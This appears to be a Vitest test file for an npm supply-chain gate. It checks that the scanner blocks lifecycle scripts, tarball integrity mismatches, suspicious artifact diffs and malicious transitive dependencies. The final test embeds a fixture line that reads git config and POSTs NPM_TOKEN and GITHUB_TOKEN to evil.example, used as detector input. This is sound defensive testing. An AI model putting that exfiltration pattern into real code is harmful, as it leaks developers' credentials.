import { createHash } from 'node:crypto';
import { mkdir, readFile, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import * as tar from 'tar';
import { describe, expect, test } from 'vitest';
import { mkdtemp } from 'node:fs/promises';
import { evaluatePackages, scanProject } from '../../src/core/engine.js';
import type { PackageMetadata, RegistryClient } from '../../src/core/types.js';
import { hashScriptCommand } from '../../src/policy/script-allowlist.js';

async function writePackage(
  root: string,
  name: string,
  manifest: Record<string, unknown>,
  files: Record<string, string | Buffer> = {}
): Promise<string> {
  const dir = join(root, name);
  await mkdir(dir, { recursive: true });
  await writeFile(join(dir, 'package.json'), JSON.stringify(manifest), 'utf8');
  for (const [path, content] of Object.entries(files)) {
    const target = join(dir, path);
    await mkdir(join(target, '..'), { recursive: true });
    await writeFile(target, content);
  }
  return dir;
}

async function packDirectory(
  root: string,
  sourceDir: string,
  tarballName: string
): Promise<Buffer> {
  const tarball = join(root, tarballName);
  await tar.c(
    {
      cwd: sourceDir,
      gzip: true,
      file: tarball,
      portable: true,
      prefix: 'package/'
    },
    ['.']
  );
  return readFile(tarball);
}

function sri(buffer: Buffer): string {
  return `sha512-${createHash('sha512').update(buffer).digest('base64')}`;
}

function registryWithTarball(
  name: string,
  buffer: Buffer,
  integrity = sri(buffer)
): RegistryClient {
  let fetches = 0;
  const metadata: PackageMetadata = {
    name,
    versions: {
      '0.9.0': {
        name,
        version: '0.9.0',
        repository: { type: 'git', url: 'https://example.test/repo.git' }
      },
      '1.0.0': {
        name,
        version: '1.0.0',
        repository: { type: 'git', url: 'https://example.test/repo.git' },
        dist: {
          tarball: `https://registry.example/${name}/-/${name}-1.0.0.tgz`,
          integrity
        }
      }
    },
    time: {
      '0.9.0': '2025-12-01T00:00:00.000Z',
      '1.0.0': '2026-01-01T00:00:00.000Z'
    },
    'dist-tags': { latest: '1.0.0' }
  };

  return {
    async getPackageMetadata() {
      return metadata;
    },
    async resolveVersion() {
      return '1.0.0';
    },
    async fetchTarball() {
      fetches += 1;
      return buffer;
    },
    isSupportedTarballUrl() {
      return true;
    },
    get fetchCount() {
      return fetches;
    }
  } as RegistryClient & { fetchCount: number };
}

function registryWithTarballs(input: {
  packages: Record<string, PackageMetadata>;
  tarballs: Record<string, Buffer>;
}): RegistryClient {
  return {
    async getPackageMetadata(name: string) {
      const metadata = input.packages[name];
      if (!metadata) throw new Error(`missing metadata for ${name}`);
      return metadata;
    },
    async resolveVersion(name: string, range = '*') {
      const metadata = input.packages[name];
      if (!metadata) throw new Error(`missing metadata for ${name}`);
      if (metadata.versions[range]) return range;
      const latest = metadata['dist-tags']?.latest;
      if (!latest) throw new Error(`missing latest for ${name}`);
      return latest;
    },
    async fetchTarball(tarballUrl: string) {
      const buffer = input.tarballs[tarballUrl];
      if (!buffer) throw new Error(`missing tarball for ${tarballUrl}`);
      return buffer;
    },
    isSupportedTarballUrl() {
      return true;
    }
  };
}

function countedRegistryWithTarballs(input: {
  packages: Record<string, PackageMetadata>;
  tarballs: Record<string, Buffer>;
}): RegistryClient & { fetchCount(url?: string): number } {
  const fetches = new Map<string, number>();
  return {
    async getPackageMetadata(name: string) {
      const metadata = input.packages[name];
      if (!metadata) throw new Error(`missing metadata for ${name}`);
      return metadata;
    },
    async resolveVersion(name: string, range = '*') {
      const metadata = input.packages[name];
      if (!metadata) throw new Error(`missing metadata for ${name}`);
      if (metadata.versions[range]) return range;
      const latest = metadata['dist-tags']?.latest;
      if (!latest) throw new Error(`missing latest for ${name}`);
      return latest;
    },
    async fetchTarball(tarballUrl: string) {
      fetches.set(tarballUrl, (fetches.get(tarballUrl) ?? 0) + 1);
      const buffer = input.tarballs[tarballUrl];
      if (!buffer) throw new Error(`missing tarball for ${tarballUrl}`);
      return buffer;
    },
    isSupportedTarballUrl() {
      return true;
    },
    fetchCount(url?: string) {
      if (url) return fetches.get(url) ?? 0;
      return [...fetches.values()].reduce((sum, count) => sum + count, 0);
    }
  };
}

describe('registry tarball inspection', () => {
  test('production profile inspects normal registry package tarballs before allowing install', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-tarball-'));
    const source = await writePackage(cwd, 'clean-src', {
      name: 'registry-clean',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/repo.git' }
    });
    const buffer = await packDirectory(cwd, source, 'registry-clean-1.0.0.tgz');
    await writeFile(
      join(cwd, 'package.json'),
      JSON.stringify({ dependencies: { 'registry-clean': '1.0.0' } })
    );
    await writeFile(
      join(cwd, 'npm-gate.config.json'),
      JSON.stringify({ profile: 'production' })
    );
    const registry = registryWithTarball('registry-clean', buffer) as RegistryClient & {
      fetchCount: number;
    };

    const report = await scanProject({
      cwd,
      registry,
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings[0]).toMatchObject({
      package: 'registry-clean',
      version: '1.0.0',
      decision: 'allow'
    });
    expect(registry.fetchCount).toBe(1);
  });

  test('registry tarball lifecycle scripts block before npm delegation', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-script-'));
    const source = await writePackage(cwd, 'script-src', {
      name: 'registry-script',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/repo.git' },
      scripts: { postinstall: 'node postinstall.js' }
    });
    const buffer = await packDirectory(cwd, source, 'registry-script-1.0.0.tgz');
    await writeFile(
      join(cwd, 'package.json'),
      JSON.stringify({ dependencies: { 'registry-script': '1.0.0' } })
    );
    await writeFile(
      join(cwd, 'npm-gate.config.json'),
      JSON.stringify({ profile: 'production' })
    );

    const report = await scanProject({
      cwd,
      registry: registryWithTarball('registry-script', buffer),
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings[0]).toMatchObject({
      package: 'registry-script',
      decision: 'block',
      reasons: ['Lifecycle script detected: postinstall']
    });
  });

  test('exact script allowlist match authorizes a reviewed lifecycle script', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-script-allow-'));
    const source = await writePackage(cwd, 'script-src', {
      name: 'registry-script-allowed',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/repo.git' },
      scripts: { postinstall: 'node postinstall.js' }
    });
    const buffer = await packDirectory(cwd, source, 'registry-script-allowed-1.0.0.tgz');
    const integrity = sri(buffer);
    await mkdir(join(cwd, '.npm-gate'), { recursive: true });
    await writeFile(
      join(cwd, '.npm-gate', 'script-allowlist.json'),
      JSON.stringify({
        scripts: [
          {
            package: 'registry-script-allowed',
            version: '1.0.0',
            script: 'postinstall',
            commandSha256: hashScriptCommand('node postinstall.js'),
            integrity,
            justification: 'SEC-20 reviewed native build'
          }
        ]
      })
    );
    await writeFile(
      join(cwd, 'package.json'),
      JSON.stringify({ dependencies: { 'registry-script-allowed': '1.0.0' } })
    );
    await writeFile(join(cwd, 'npm-gate.config.json'), JSON.stringify({ profile: 'production' }));

    const report = await scanProject({
      cwd,
      registry: registryWithTarball('registry-script-allowed', buffer, integrity),
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings[0]).toMatchObject({
      package: 'registry-script-allowed',
      decision: 'allow',
      allowlist: expect.objectContaining({ used: true, scope: 'script' })
    });
    expect(report.findings[0]?.reasons).toEqual(['No policy issues detected']);
  });

  test('script allowlist mismatch does not authorize changed lifecycle script content', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-script-allow-mismatch-'));
    const source = await writePackage(cwd, 'script-src', {
      name: 'registry-script-changed',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/repo.git' },
      scripts: { postinstall: 'node changed.js' }
    });
    const buffer = await packDirectory(cwd, source, 'registry-script-changed-1.0.0.tgz');
    const integrity = sri(buffer);
    await mkdir(join(cwd, '.npm-gate'), { recursive: true });
    await writeFile(
      join(cwd, '.npm-gate', 'script-allowlist.json'),
      JSON.stringify({
        scripts: [
          {
            package: 'registry-script-changed',
            version: '1.0.0',
            script: 'postinstall',
            commandSha256: hashScriptCommand('node old.js'),
            integrity,
            justification: 'SEC-21 old script'
          }
        ]
      })
    );
    await writeFile(
      join(cwd, 'package.json'),
      JSON.stringify({ dependencies: { 'registry-script-changed': '1.0.0' } })
    );
    await writeFile(join(cwd, 'npm-gate.config.json'), JSON.stringify({ profile: 'production' }));

    const report = await scanProject({
      cwd,
      registry: registryWithTarball('registry-script-changed', buffer, integrity),
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings[0]).toMatchObject({
      package: 'registry-script-changed',
      decision: 'block'
    });
    expect(report.findings[0]?.reasons).toEqual(
      expect.arrayContaining(['Lifecycle script detected: postinstall'])
    );
  });

  test('integrity mismatch blocks registry tarballs', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-integrity-'));
    const source = await writePackage(cwd, 'integrity-src', {
      name: 'registry-integrity',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/repo.git' }
    });
    const buffer = await packDirectory(cwd, source, 'registry-integrity-1.0.0.tgz');
    await writeFile(
      join(cwd, 'package.json'),
      JSON.stringify({ dependencies: { 'registry-integrity': '1.0.0' } })
    );
    await writeFile(
      join(cwd, 'npm-gate.config.json'),
      JSON.stringify({ profile: 'production' })
    );

    const report = await scanProject({
      cwd,
      registry: registryWithTarball('registry-integrity', buffer, 'sha512-bad'),
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings[0]).toMatchObject({
      package: 'registry-integrity',
      decision: 'block',
      reasons: ['Registry tarball integrity does not match metadata']
    });
  });

  test('tarball inspections are cached by package version and integrity', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-cache-'));
    const source = await writePackage(cwd, 'cache-src', {
      name: 'registry-cache',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/repo.git' }
    });
    const buffer = await packDirectory(cwd, source, 'registry-cache-1.0.0.tgz');
    await writeFile(
      join(cwd, 'package.json'),
      JSON.stringify({
        dependencies: { 'registry-cache': '1.0.0' },
        devDependencies: { 'registry-cache': '1.0.0' }
      })
    );
    await writeFile(
      join(cwd, 'npm-gate.config.json'),
      JSON.stringify({ profile: 'production' })
    );
    const registry = registryWithTarball('registry-cache', buffer) as RegistryClient & {
      fetchCount: number;
    };

    await scanProject({
      cwd,
      registry,
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(registry.fetchCount).toBe(1);
  });

  test('diffs current patch tarball against previous version and reports new binary files', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-artifact-binary-'));
    const previousSource = await writePackage(cwd, 'artifact-prev-src', {
      name: 'artifact-binary',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/artifact.git' }
    });
    const currentSource = await writePackage(
      cwd,
      'artifact-current-src',
      {
        name: 'artifact-binary',
        version: '1.0.1',
        repository: { type: 'git', url: 'https://example.test/artifact.git' }
      },
      { 'native.node': Buffer.from([0, 1, 2, 3]) }
    );
    const previousBuffer = await packDirectory(cwd, previousSource, 'artifact-binary-1.0.0.tgz');
    const currentBuffer = await packDirectory(cwd, currentSource, 'artifact-binary-1.0.1.tgz');
    const previousTarball = 'https://registry.example/artifact-binary/-/artifact-binary-1.0.0.tgz';
    const currentTarball = 'https://registry.example/artifact-binary/-/artifact-binary-1.0.1.tgz';
    await writeFile(join(cwd, 'package.json'), JSON.stringify({ dependencies: { 'artifact-binary': '1.0.1' } }));
    await writeFile(join(cwd, 'npm-gate.config.json'), JSON.stringify({ profile: 'production' }));

    const report = await scanProject({
      cwd,
      registry: registryWithTarballs({
        packages: {
          'artifact-binary': {
            name: 'artifact-binary',
            versions: {
              '1.0.0': {
                name: 'artifact-binary',
                version: '1.0.0',
                repository: { type: 'git', url: 'https://example.test/artifact.git' },
                dist: { tarball: previousTarball, integrity: sri(previousBuffer) }
              },
              '1.0.1': {
                name: 'artifact-binary',
                version: '1.0.1',
                repository: { type: 'git', url: 'https://example.test/artifact.git' },
                dist: { tarball: currentTarball, integrity: sri(currentBuffer) }
              }
            },
            time: {
              '1.0.0': '2026-01-01T00:00:00.000Z',
              '1.0.1': '2026-01-02T00:00:00.000Z'
            },
            'dist-tags': { latest: '1.0.1' }
          }
        },
        tarballs: { [previousTarball]: previousBuffer, [currentTarball]: currentBuffer }
      }),
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings[0]).toMatchObject({
      package: 'artifact-binary',
      riskCategory: 'artifact_diff_risk'
    });
    expect(report.findings[0]?.matchedSignals).toContain('new-binary-file');
  });

  test('reports suspicious package size increase from previous tarball comparison', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-artifact-size-'));
    const previousSource = await writePackage(cwd, 'artifact-size-prev-src', {
      name: 'artifact-size',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/artifact-size.git' }
    });
    const currentSource = await writePackage(
      cwd,
      'artifact-size-current-src',
      {
        name: 'artifact-size',
        version: '1.0.1',
        repository: { type: 'git', url: 'https://example.test/artifact-size.git' }
      },
      { 'big.dat': Buffer.alloc(80_000, 1) }
    );
    const previousBuffer = await packDirectory(cwd, previousSource, 'artifact-size-1.0.0.tgz');
    const currentBuffer = await packDirectory(cwd, currentSource, 'artifact-size-1.0.1.tgz');
    const previousTarball = 'https://registry.example/artifact-size/-/artifact-size-1.0.0.tgz';
    const currentTarball = 'https://registry.example/artifact-size/-/artifact-size-1.0.1.tgz';
    await writeFile(join(cwd, 'package.json'), JSON.stringify({ dependencies: { 'artifact-size': '1.0.1' } }));
    await writeFile(join(cwd, 'npm-gate.config.json'), JSON.stringify({ profile: 'production' }));

    const report = await scanProject({
      cwd,
      registry: registryWithTarballs({
        packages: {
          'artifact-size': {
            name: 'artifact-size',
            versions: {
              '1.0.0': {
                name: 'artifact-size',
                version: '1.0.0',
                repository: { type: 'git', url: 'https://example.test/artifact-size.git' },
                dist: { tarball: previousTarball, integrity: sri(previousBuffer) }
              },
              '1.0.1': {
                name: 'artifact-size',
                version: '1.0.1',
                repository: { type: 'git', url: 'https://example.test/artifact-size.git' },
                dist: { tarball: currentTarball, integrity: sri(currentBuffer) }
              }
            },
            time: {
              '1.0.0': '2026-01-01T00:00:00.000Z',
              '1.0.1': '2026-01-02T00:00:00.000Z'
            },
            'dist-tags': { latest: '1.0.1' }
          }
        },
        tarballs: { [previousTarball]: previousBuffer, [currentTarball]: currentBuffer }
      }),
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings[0]?.matchedSignals).toContain('suspicious-package-size-increase');
  });

  test('caches both current and previous tarball inspections for duplicate candidates', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-artifact-cache-'));
    const previousSource = await writePackage(cwd, 'artifact-cache-prev-src', {
      name: 'artifact-cache',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/artifact-cache.git' }
    });
    const currentSource = await writePackage(cwd, 'artifact-cache-current-src', {
      name: 'artifact-cache',
      version: '1.0.1',
      repository: { type: 'git', url: 'https://example.test/artifact-cache.git' }
    });
    const previousBuffer = await packDirectory(cwd, previousSource, 'artifact-cache-1.0.0.tgz');
    const currentBuffer = await packDirectory(cwd, currentSource, 'artifact-cache-1.0.1.tgz');
    const previousTarball = 'https://registry.example/artifact-cache/-/artifact-cache-1.0.0.tgz';
    const currentTarball = 'https://registry.example/artifact-cache/-/artifact-cache-1.0.1.tgz';
    await writeFile(join(cwd, 'npm-gate.config.json'), JSON.stringify({ profile: 'production' }));
    const registry = countedRegistryWithTarballs({
      packages: {
        'artifact-cache': {
          name: 'artifact-cache',
          versions: {
            '1.0.0': {
              name: 'artifact-cache',
              version: '1.0.0',
              repository: { type: 'git', url: 'https://example.test/artifact-cache.git' },
              dist: { tarball: previousTarball, integrity: sri(previousBuffer) }
            },
            '1.0.1': {
              name: 'artifact-cache',
              version: '1.0.1',
              repository: { type: 'git', url: 'https://example.test/artifact-cache.git' },
              dist: { tarball: currentTarball, integrity: sri(currentBuffer) }
            }
          },
          time: {
            '1.0.0': '2026-01-01T00:00:00.000Z',
            '1.0.1': '2026-01-02T00:00:00.000Z'
          },
          'dist-tags': { latest: '1.0.1' }
        }
      },
      tarballs: { [previousTarball]: previousBuffer, [currentTarball]: currentBuffer }
    });

    await evaluatePackages({
      cwd,
      registry,
      candidates: [
        { name: 'artifact-cache', spec: '1.0.1' },
        { name: 'artifact-cache', spec: '1.0.1' }
      ],
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(registry.fetchCount(previousTarball)).toBe(1);
    expect(registry.fetchCount(currentTarball)).toBe(1);
  });

  test('reports previous tarball unavailability as artifact diff review evidence', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-artifact-missing-prev-'));
    const currentSource = await writePackage(cwd, 'artifact-missing-prev-current-src', {
      name: 'artifact-missing-prev',
      version: '1.0.1',
      repository: { type: 'git', url: 'https://example.test/artifact-missing-prev.git' }
    });
    const currentBuffer = await packDirectory(cwd, currentSource, 'artifact-missing-prev-1.0.1.tgz');
    const previousTarball =
      'https://registry.example/artifact-missing-prev/-/artifact-missing-prev-1.0.0.tgz';
    const currentTarball =
      'https://registry.example/artifact-missing-prev/-/artifact-missing-prev-1.0.1.tgz';
    await writeFile(join(cwd, 'package.json'), JSON.stringify({ dependencies: { 'artifact-missing-prev': '1.0.1' } }));
    await writeFile(join(cwd, 'npm-gate.config.json'), JSON.stringify({ profile: 'production' }));

    const report = await scanProject({
      cwd,
      registry: registryWithTarballs({
        packages: {
          'artifact-missing-prev': {
            name: 'artifact-missing-prev',
            versions: {
              '1.0.0': {
                name: 'artifact-missing-prev',
                version: '1.0.0',
                repository: { type: 'git', url: 'https://example.test/artifact-missing-prev.git' },
                dist: { tarball: previousTarball, integrity: 'sha512-missing' }
              },
              '1.0.1': {
                name: 'artifact-missing-prev',
                version: '1.0.1',
                repository: { type: 'git', url: 'https://example.test/artifact-missing-prev.git' },
                dist: { tarball: currentTarball, integrity: sri(currentBuffer) }
              }
            },
            time: {
              '1.0.0': '2026-01-01T00:00:00.000Z',
              '1.0.1': '2026-01-02T00:00:00.000Z'
            },
            'dist-tags': { latest: '1.0.1' }
          }
        },
        tarballs: { [currentTarball]: currentBuffer }
      }),
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings[0]?.matchedSignals).toContain('previous-tarball-unavailable');
    expect(report.findings[0]?.riskCategory).toBe('artifact_diff_risk');
  });

  test('production profile blocks hidden transitive dependencies before delegation', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-transitive-'));
    const axiosSource = await writePackage(cwd, 'axios-src', {
      name: 'axios',
      version: '1.14.1',
      repository: { type: 'git', url: 'https://example.test/axios.git' },
      dependencies: { 'plain-crypto-js': '4.2.1' }
    });
    const evilSource = await writePackage(cwd, 'plain-crypto-js-src', {
      name: 'plain-crypto-js',
      version: '4.2.1',
      repository: { type: 'git', url: 'https://example.test/plain-crypto-js.git' },
      scripts: { postinstall: 'node install.js' }
    });
    const axiosBuffer = await packDirectory(cwd, axiosSource, 'axios-1.14.1.tgz');
    const evilBuffer = await packDirectory(
      cwd,
      evilSource,
      'plain-crypto-js-4.2.1.tgz'
    );
    const axiosTarball = 'https://registry.example/axios/-/axios-1.14.1.tgz';
    const evilTarball =
      'https://registry.example/plain-crypto-js/-/plain-crypto-js-4.2.1.tgz';
    await writeFile(join(cwd, 'package.json'), JSON.stringify({ dependencies: { axios: '1.14.1' } }));
    await writeFile(join(cwd, 'npm-gate.config.json'), JSON.stringify({ profile: 'production' }));

    const report = await scanProject({
      cwd,
      registry: registryWithTarballs({
        packages: {
          axios: {
            name: 'axios',
            versions: {
              '1.14.1': {
                name: 'axios',
                version: '1.14.1',
                repository: { type: 'git', url: 'https://example.test/axios.git' },
                dependencies: { 'plain-crypto-js': '4.2.1' },
                dist: { tarball: axiosTarball, integrity: sri(axiosBuffer) }
              }
            },
            time: { '1.14.1': '2026-01-01T00:00:00.000Z' },
            'dist-tags': { latest: '1.14.1' }
          },
          'plain-crypto-js': {
            name: 'plain-crypto-js',
            versions: {
              '4.2.1': {
                name: 'plain-crypto-js',
                version: '4.2.1',
                repository: { type: 'git', url: 'https://example.test/plain-crypto-js.git' },
                scripts: { postinstall: 'node install.js' },
                dist: { tarball: evilTarball, integrity: sri(evilBuffer) }
              }
            },
            time: { '4.2.1': '2026-01-01T00:00:00.000Z' },
            'dist-tags': { latest: '4.2.1' }
          }
        },
        tarballs: { [axiosTarball]: axiosBuffer, [evilTarball]: evilBuffer }
      }),
      env: { NPM_GATE_MODE: 'ci' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          package: 'plain-crypto-js',
          version: '4.2.1',
          decision: 'block',
          reasons: expect.arrayContaining(['Lifecycle script detected: postinstall']),
          evidence: expect.arrayContaining([
            expect.objectContaining({
              value: expect.objectContaining({
                dependencyPath: ['axios@1.14.1', 'plain-crypto-js@4.2.1']
              })
            })
          ])
        })
      ])
    );
  });

  test('production profile blocks embedded credential exfiltration patterns without lifecycle hooks', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-embedded-'));
    const source = await writePackage(
      cwd,
      'embedded-src',
      {
        name: 'embedded-malware',
        version: '1.0.0',
        repository: { type: 'git', url: 'https://example.test/embedded.git' }
      },
      {
        'lib/client.js':
          "const cp = require('child_process'); cp.exec('git config --global --list'); fetch('https://evil.example/upload', { method: 'POST', body: process.env.NPM_TOKEN + process.env.GITHUB_TOKEN });"
      }
    );
    const buffer = await packDirectory(cwd, source, 'embedded-malware-1.0.0.tgz');
    await writeFile(
      join(cwd, 'package.json'),
      JSON.stringify({ dependencies: { 'embedded-malware': '1.0.0' } })
    );
    await writeFile(join(cwd, 'npm-gate.config.json'), JSON.stringify({ profile: 'production' }));

    const report = await scanProject({
      cwd,
      registry: registryWithTarball('embedded-malware', buffer),
      env: { NPM_GATE_MODE: 'ci' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings[0]).toMatchObject({
      package: 'embedded-malware',
      version: '1.0.0',
      decision: 'block'
    });
    expect(report.findings[0]?.reasons).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/Credential harvesting|network exfiltration/)
      ])
    );
  });
});
